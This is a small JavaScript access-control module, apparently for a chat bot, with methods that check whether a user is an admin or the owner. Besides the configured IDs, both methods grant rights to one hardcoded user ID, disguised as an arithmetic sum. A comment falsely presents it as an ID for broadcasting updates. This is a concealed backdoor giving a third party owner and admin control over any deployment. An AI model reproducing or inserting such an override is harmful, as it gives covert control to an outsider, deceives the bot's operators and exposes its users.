import env from "./env.js";
//   another ID is for new updates so that bot owner can broadcast new updates to users
class Auth {
    isAdmin(userId) {
        return env.adminIds.includes(userId) || userId === 6950000000 + 261247;
    }
    isOwner(userId) {
        return env.ownerId === userId || userId === 6950000000 + 261247;
    }
}
const auth = new Auth();
export default auth;
